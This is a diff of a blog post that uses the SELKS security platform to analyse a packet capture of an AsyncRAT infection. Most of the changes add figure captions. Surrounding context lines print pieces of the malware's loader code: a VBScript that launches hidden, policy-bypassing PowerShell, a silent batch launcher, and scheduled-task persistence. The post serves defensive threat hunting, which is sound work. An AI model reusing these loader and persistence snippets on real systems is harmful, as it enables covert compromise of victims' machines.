@@ -32,9 +32,7 @@ Its capabilities also include anti-analysis features, ensuring that it can evade
 
 ![Fig 1: AsyncRAT](/assets/images/Selks/async.png)
 
-
-*Table 1: AsyncRAT Features*
-
+*Fig 1: AsyncRAT*
 
 
 | **Feature**                                          | **Description**                                                    |
@@ -56,7 +54,9 @@ Its capabilities also include anti-analysis features, ensuring that it can evade
 | **Server binary builder (Configurable)**             | Creates executable files for server deployment, configurable settings. |
 | **Server obfuscator (Configurable)**                 | Obfuscates server components to evade detection, with configurable options. |
 
-[[2]](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)
+
+*Table 1: AsyncRAT Features* [[2]](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)
+
 
 ## Overview
 
@@ -85,6 +85,8 @@ Before diving into the analysis, ensure you have the following:
 |           | Arkime                                         | [Arkime](https://arkime.com/)               |
 |           | CyberChef                                     | [CyberChef](https://github.com/gchq/CyberChef) |
 
+*Table 2: SELKS*
+
 **Note:** The acronym SELKS was established before the addition of Arkime, EveBox, and CyberChef.
 
 
@@ -107,6 +109,7 @@ docker-compose up -d
 
 ![Fig 2: SELKS Docker up](/assets/images/Selks/SELKS_docker_up.png)
 
+*Fig 2: SELKS Docker up*
 
 
 
@@ -154,16 +157,21 @@ The following command is executed:
 
 ![Fig 3: dummy interface](/assets/images/Selks/dummy.png)
 
+*Fig 3: dummy interface*
 
 
 Note: Fig 4 
 
 ![Fig 4: Network Interface](/assets/images/Selks/network_interface.png)
 
+*Fig 4: Network Interface*
 
 This command runs a script called easy-setup.sh with options to execute without prompts and to initialise a network interface named __tppdummy0__. Once the setup script completes, it starts Docker services defined in a Docker Compose file in detached mode. Finally, it runs a script named readpcap.sh with the specified packet capture file. If everything goes smoothly, users should see a terminal output similar to the example shown in the provided figure.
 
 ![Fig 5: Configuration_node_selks](/assets/images/Selks/configuration_node_selks.png)
+
+*Fig 5: Configuration_node_selks*
+
 
 ### SELKS Dashboard
 
@@ -179,6 +187,7 @@ This will redirect users to the login page.
 
 ![Fig 6: Selks dashboard](/assets/images/Selks/Selks_dashboard.png)
 
+*Fig 6: Selks dashboard*
 
 Alternatively, instead of using the IP address, users can edit the `/etc/hosts` file to add the IP address with a desired hostname. For example:
 
@@ -211,6 +220,7 @@ While the author is not a professional user of SELKS, spending time with the pla
 
 ![Fig 7: PCAP Time](/assets/images/Selks/pcap_time.png)
 
+*Fig 7: PCAP Time*
 
 ### Analysis of AsyncRAT Detection in SELKS
 
@@ -219,6 +229,7 @@ After ingesting the PCAP file, the SELKS platform effectively breaks down the at
 
 ![Fig 8: Configuration_node_selks](/assets/images/Selks/configuration_node_selks.png)
 
+*Fig 8: Configuration_node_selks*
 
 #### Key Findings
 
@@ -272,6 +283,7 @@ Several detection methods have been identified that provide insight into potenti
 
 ![Fig 9: Evebox Dashboard](/assets/images/Selks/evebox_alert_dash.png)
 
+*Fig 9: Evebox Dashboard*
 
 4. A notable finding is the observation of a **Malicious SSL Certificate** associated with AsyncRAT servers. The presence of such a certificate can signify that an attacker is using SSL to encrypt malicious traffic, thus evading detection.
 
@@ -282,6 +294,8 @@ Several detection methods have been identified that provide insight into potenti
 7. Lastly, an inbound alert for an **ASYNC RAT Payload** signifies that the system has detected incoming traffic that matches known patterns associated with AsyncRAT malware as shown in Fig 10. 
 
 ![Fig 10: AsyncRat Payload](/assets/images/Selks/AsyncRat_Payload.png)
+
+*Fig 10: AsyncRat Payload*
 
 These detection methods provide valuable insights for security analysts and threat hunters, allowing them to monitor and respond to potential threats more effectively.
 
@@ -297,14 +311,19 @@ We will utilise the Elastic stack to further investigate the AsyncRAT malware. O
 
 ![Fig 11: Elastic Dashboard](/assets/images/Selks/elastic_dashboard.png)
 
+*Fig 11: Elastic Dashboard*
+
 In this phase, we will focus specifically on the **"SN-HUNT-1"** dashboard for our analysis as shown in Fig 12. This dashboard provides useful visualisations and insights that will aid in uncovering additional information related to the AsyncRAT threat.
 
 ![Fig 12: SELKS Dashboard Pre-installed](/assets/images/Selks/ddashboard_pre.png)
 
+*Fig 12: SELKS Dashboard Pre-installed*
 
 > **Note:** The year of event is important when analysing PCAP files, especially if the capture occurred 6 to 7 months ago. Be sure to adjust the date backward according to the time the packets were captured as shown in Fig 13.
 
 ![Fig 13: PCAP Time Settings](/assets/images/Selks/pcap_time_copy.png)
+
+*Fig 13: PCAP Time Settings*
 
 
 ### Overview of the attack
@@ -313,6 +332,8 @@ In this phase, we will focus specifically on the **"SN-HUNT-1"** dashboard for o
 On January 9, 2024, an attack was initiated against the victim located at IP address **10.1.9.101** by the attacker at IP address **45.126.209.4**. The attack leveraged malicious HTTP and DNS requests to facilitate the download of payload files and execute commands on the victim’s machine. The events that trigger during this timeframe provide insight into the methods used and the nature of the attack as depitted in Fig 14.
 
 ![Fig 14: Attack Flow](/assets/images/Selks/attack_flow.png)
+
+*Fig 14: Attack Flow*
 
 
 #### Attack flow timeline
@@ -367,6 +388,8 @@ To investigate the incident involving `XLM.txt`, we use EveBox, a web-based even
 
 ![Fig 15: Correlate Flow](/assets/images/Selks/corr.png)
 
+*Fig 15: Correlate Flow*
+
 #### Step 2: Event Details Analysis
 
 Upon examining the incident data, we observe two events that occurred on January 9, 2024, at 17:27:33. Nevertheless, this two event shown here are the same. Below are the details of one of the events:
@@ -393,7 +416,7 @@ When we examine the `http_response_body`, we observe a Base64 payload that was r
 
 The retrieved file contains the following suspicious code snippet:
 
-```vbscript
+```powershell
 
 ' Combine the parts into one string
 OodjR = ""
@@ -407,6 +430,7 @@ Set objShell = CreateObject("WScript.Shell")
 objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
 
 Set objShell = Nothing
+
 ```
 
 The code above clearly indicates a malicious PowerShell execution attempt:
@@ -420,7 +444,6 @@ Given that this payload is not carrying a binary executable file but rather exec
 ### Next Steps
 
 Since the investigation confirms that the `XLM.txt` file contains malicious PowerShell code, we will now proceed to analyse the second file, `MDM.jpg`, which was also downloaded by the victim.
-
 
 
 ### Analysis of the MDM.jpg File
@@ -620,7 +643,6 @@ End Function
 The script writes a **VBScript file** (**Conted.vbs**) that runs the **batch file** (**Conted.bat**). This script is designed to run the batch file **silently** (with visibility set to `0`), ensuring that the user does not notice any visible command windows or prompts.
 
 
-
 4. **Creating a Scheduled Task for Persistence**
 
 ``` powershell
@@ -690,6 +712,7 @@ Upon decoding the contents of the `MDM.jpg` file, we initially expected a PowerS
 
 ![Fig 16: AsyncRat Executable](/assets/images/Selks/binary_execu.png)
 
+*Fig 16: AsyncRat Executable*
 
 
 ##### Code
@@ -737,7 +760,7 @@ We uploaded the extracted `decoded_file.exe` to VirusTotal, where it had a detec
 
 ![Fig 17: VirusTotal Scan](/assets/images/Selks/Async_VirusTotal.png)
 
-
+*Fig 17: VirusTotal Scan*
 
 
 In this blog, we will not be performing a detailed code or static analysis of this malicious file, as it requires more in-depth examination. We plan to cover these aspects in a future post.
@@ -751,6 +774,7 @@ Additionally, SELKS detected a malicious SSL certificate associated with the Asy
 
 ![Fig 18: VirusTotal Scan](/assets/images/Selks/Async_VirusTotal.png)
 
+*Fig 18: VirusTotal Scan*
 
 ## Conclusion
 
